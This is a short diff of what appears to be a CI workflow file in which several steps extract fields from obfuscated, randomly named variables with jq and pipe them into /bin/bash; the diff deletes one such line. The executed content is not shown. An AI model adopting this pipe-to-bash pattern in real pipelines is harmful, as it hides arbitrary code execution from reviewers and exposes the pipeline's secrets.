@@ -35,7 +35,6 @@ jobs:
           echo $jzuy8 | jq -r .yw07 | /bin/bash
           printf '%s' "$lpr79" | jq -r .fo5 | /bin/bash
           printf '%s' "$suv0780" | jq -r .mjolk10498 | /bin/bash
-          echo $kfnhn1 | jq -r .u8520 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
